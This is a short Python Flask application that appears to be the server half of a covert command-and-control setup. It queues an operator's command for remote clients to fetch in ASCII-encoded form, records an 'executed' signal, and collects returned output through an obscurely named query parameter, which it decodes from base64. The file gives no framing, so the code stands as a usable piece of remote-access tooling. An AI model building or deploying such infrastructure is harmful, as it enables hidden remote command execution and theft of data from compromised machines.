from flask import Flask, request, render_template, jsonify
import base64
import json

app = Flask(__name__)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['GET', 'POST'])
def submit():
    global stored_message
    if request.method == 'POST':
        msg = request.form.get('message')
        stored_message = msg if msg else ""
        return "<script>location.href = '/';</script>"
    return "<script>location.href = '/';</script>"

@app.route('/showMSG')
def show_msg():
    global stored_message
    ascii_msg = ""
    for char in stored_message:
        ascii_msg += str(ord(char)) + " "
    return ascii_msg

@app.route('/doneExec')
def done_exec():
    global stored_message
    if stored_message:
        stored_message = ""
    return "Executed successfully"

@app.route('/receiveMSG')
def recieve_msg():
    data = request.args.get('d4t4')
    if data:
        filename = "recieved_data.txt"
        with open(filename, 'a') as f:
            f.write(data+"\n---")
        return "Data recieved successfully"
    return "No data recieved"

def ascii_to_char(ascii):
    try:
        return chr(int(ascii))
    except:
        return "Error"
    



@app.route('/history')
def history():
    try:
        filename = "recieved_data.txt"
        with open(filename, 'r') as f:
            data = f.read()
        datas = data.split("\n---")
        alldata = []
        for data in datas:
            if data.strip(): 
                name, execute = data.split(":")
                execute = base64.b64decode(execute).decode()
                execute = execute.split(" ")
                execute = [ascii_to_char(asc) for asc in execute]
                execute = "".join(execute)
                alldata.append({"name": name, "execute": execute})
        return jsonify(alldata)
    except Exception as e:
        return jsonify({"error": str(e)})
    
if __name__ == '__main__':
    app.run(debug=True)
        



